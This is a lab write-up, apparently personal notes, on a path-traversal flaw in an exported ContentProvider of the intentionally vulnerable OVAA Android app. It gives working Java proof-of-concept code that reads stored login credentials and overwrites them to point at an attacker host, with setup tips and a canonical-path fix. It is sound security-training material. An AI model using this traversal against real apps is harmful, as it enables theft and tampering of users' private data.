# TheftOverwriteProvider — Path Traversal (Read + Overwrite)

**Component:** `oversecured.ovaa.providers.TheftOverwriteProvider`
**Class:** Exported ContentProvider → Path Traversal (CWE-22 + CWE-926)
**Status:** ✅ Confirmed, PoC working

## Vulnerable code

\`\`\`java
public ParcelFileDescriptor openFile(@NonNull Uri uri, @NonNull String mode) {
    File file = new File(Environment.getExternalStorageDirectory(), uri.getLastPathSegment());
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_WRITE);
}
\`\`\`

Manifest:
\`\`\`xml
<provider android:name=".providers.TheftOverwriteProvider"
    android:authorities="oversecured.ovaa.theftoverwrite"
    android:exported="true" />
\`\`\`

## Root cause

- No permission required to call this provider (zero-permission attacker app)
- `getLastPathSegment()` trusted as a literal filename
- `%2F`-encoding smuggles `../` traversal sequences past Android's URI path splitting
- `mode` argument from the caller is ignored — always opens `MODE_READ_WRITE`
- No `MODE_CREATE` — limits write primitive to overwriting existing files, not creating new ones

## PoC — Read

\`\`\`java
String target = "../../../../data/data/oversecured.ovaa/shared_prefs/login_data.xml";
Uri uri = Uri.parse("content://oversecured.ovaa.theftoverwrite/" + Uri.encode(target, ""));
InputStream is = getContentResolver().openInputStream(uri);
\`\`\`

**Result:** full plaintext `login_data.xml` exfiltrated — `login_url`, `password`, `email` all readable from a zero-permission attacker app.

## PoC — Overwrite

Same traversal, `openOutputStream()` instead:

\`\`\`java
OutputStream os = getContentResolver().openOutputStream(uri);
os.write(payload.getBytes()); // poisoned login_url / password / email
\`\`\`

**Before → after**, confirmed via `run-as` on the victim's `shared_prefs/login_data.xml`:
- `login_url`: `http://example.com./` → `http://attacker-controlled.com/`
- `password`: `admin` → `pwned`

## Required setup gotchas (for future-me)

- Package Visibility (API 30+): attacker app manifest needs
  \`\`\`xml
  <queries><provider android:authorities="oversecured.ovaa.theftoverwrite" /></queries>
  \`\`\`
  without it, `ContentResolver` throws "No content provider" even though it's exported.
- `adb root` fails on non-rooted emulator images — use `adb shell run-as <pkg>` instead to inspect victim's private storage (only works on debuggable builds).
- OVAA creates `shared_prefs/login_data.xml` lazily — must actually log in through the app's UI once before any file exists to steal.

## Remediation

\`\`\`java
File base = Environment.getExternalStorageDirectory();
File file = new File(base, uri.getLastPathSegment()).getCanonicalFile();
if (!file.getPath().startsWith(base.getCanonicalPath() + File.separator)) {
    throw new SecurityException("Path traversal attempt blocked");
}
\`\`\`
Honor the caller-supplied `mode` instead of hardcoding `MODE_READ_WRITE`.
